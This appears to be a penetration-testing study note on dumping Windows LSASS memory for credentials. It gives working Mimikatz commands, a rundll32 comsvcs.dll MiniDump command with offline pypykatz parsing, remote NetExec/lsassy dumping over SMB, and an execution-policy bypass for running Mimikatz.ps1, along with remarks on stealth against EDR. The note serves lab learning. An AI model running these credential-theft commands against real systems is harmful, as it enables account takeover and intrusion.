
---

# 

> [!info]  
> LSASS attacks are about extracting credentials stored in **memory (RAM)** on a Windows system, not from disk like SAM.

---

## 🧩 Core Idea

> [!important]  
> LSASS = **live authentication brain of Windows**
> 
> It stores:
> 
> - NTLM hashes
>     
> - Kerberos tickets
>     
> - Sometimes plaintext credentials (older systems / misconfigurations)
>     
> - DPAPI keys
>     

---

# ⚙️ Attack Flow (How it actually works)

> [!note]  
> Every LSASS attack follows the same 2-stage pipeline:

### 1. On TARGET (Windows)

You extract memory:

- LSASS dump (`lsass.dmp`)
    
- OR direct credential extraction (Mimikatz / NetExec / lsassy)
    

### 2. On ATTACKER (Linux/Windows)

You analyze:

- `pypykatz`
    
- `mimikatz`
    
- `hashcat`
    

---

# 🧪 Methods of Attacking LSASS

## 🔴 Method 1 — Live Mimikatz (Target-side)

> [!warning]  
> Requires execution on victim machine. High detection risk.

### Example flow:

```powershell
privilege::debug
sekurlsa::logonpasswords
```

✔ Directly reads LSASS memory  
❌ Very noisy (EDR/Defender usually blocks)

---

## 🟡 Method 2 — LSASS Dump (Most common)

> [!success]  
> Stealthier and widely used in labs & real engagements

### Step 1 (target machine)

```powershell
#runas admin in ps
tasklist /svc       #list svc get pid
rundll32 comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

### Step 2 (attacker machine)

```bash
pypykatz lsa minidump lsass.dmp
```

✔ Offline analysis  
✔ Safer operationally  
✔ Works even after disconnect

---

## 🟢 Method 3 — Remote Automation (NetExec / lsassy)

> [!tip]  
> No manual dumping required. Everything is automated over SMB.

```bash
nxc smb <TARGET_IP> -u user -p pass -M lsassy
```

### What it does internally:

- logs in via SMB
    
- opens LSASS remotely
    
- extracts credentials
    
- returns hashes/secrets
    

---

# 🧱 Why Mimikatz/LSASS works

> [!important]  
> Windows does NOT store passwords in memory directly in modern systems.
> 
> Instead it stores:
> 
> - NTLM hashes
>     
> - Kerberos tickets
>     
> - Encryption keys (DPAPI material)
>     

So attackers steal **authentication material**, not plaintext passwords (usually).

---

# ❌ Your PowerShell Error Explained

```text
running scripts is disabled on this system
```

> [!warning]  
> This is PowerShell Execution Policy blocking `.ps1` scripts.

### Fix (lab-safe)

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

Then run:

```powershell
.\Mimikatz.ps1
```

---

# 🧠 Tool Location Reality (Critical)

> [!important]  
> This is where most confusion happens:

|Tool|Runs on|Purpose|
|---|---|---|
|mimikatz.exe|TARGET|live LSASS dumping|
|mimikatz.ps1|TARGET|same idea, script form|
|pypykatz|ATTACKER|parse LSASS dump|
|secretsdump.py|ATTACKER|remote SAM/LSA extraction|
|lsassy module|ATTACKER → TARGET|automated LSASS dumping|
|netexec (nxc)|ATTACKER|remote execution framework|

---

# 🧠 Key takeaway

> [!summary]  
> LSASS attack = **memory extraction problem**
> 
> You either:
> 
> - steal LSASS memory (dump)
>     
> - or query LSASS directly (Mimikatz / remote tools)
>     
> - then analyze offline (pypykatz/hashcat)
>     

---

